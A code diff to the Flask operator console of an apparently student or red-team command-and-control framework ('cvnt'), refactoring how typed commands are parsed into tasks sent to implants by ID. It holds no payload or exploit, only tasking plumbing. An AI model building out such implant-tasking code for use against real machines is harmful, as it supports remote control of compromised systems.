@@ -6,7 +6,7 @@ from wtforms.validators import DataRequired, Length
 from cvnt.client_pb2 import *
 from urllib.parse import urljoin
 from cvnt.client_pb2 import Command, ClientTaskRequest, ClientTaskResponse, Packet
-from cvnt.constants import opcodes, extras
+from cvnt.constants import opcodes, extras, to_opcode
 from cvnt.database import db
 from cvnt.db_operations import make_task, get_list, get_implant_by_id
 
@@ -37,7 +37,7 @@ def index():
         if len(words) == 1:
             if words[0] in extras:
                 print('printing??????')
-                #implants = get_list()
+                implants = get_list()
                 #for impl in implants:
                     #curr = get_implant_by_id(impl)
                     #lat = curr.latitude
@@ -56,6 +56,8 @@ def index():
         else:
             if words[1] in opcodes:
                 first_two_words = words[:2]
+                implant_id = first_two_words[0]
+                cmd = first_two_words[1]
                 rest_of_words = words[2:]
                 rest_string = ' '.join(rest_of_words)
                 handle_task_request(implant_id, cmd, rest_string)
@@ -70,8 +72,6 @@ def analyze_input(cmd, args):
 def handle_local_request(cmd, args):
     pass
     
-def to_opcode(cmd):
-    pass
 
 # @client.route('/client/task/request', methods=["POST"])
 def handle_task_request(implant_id, cmd, args):
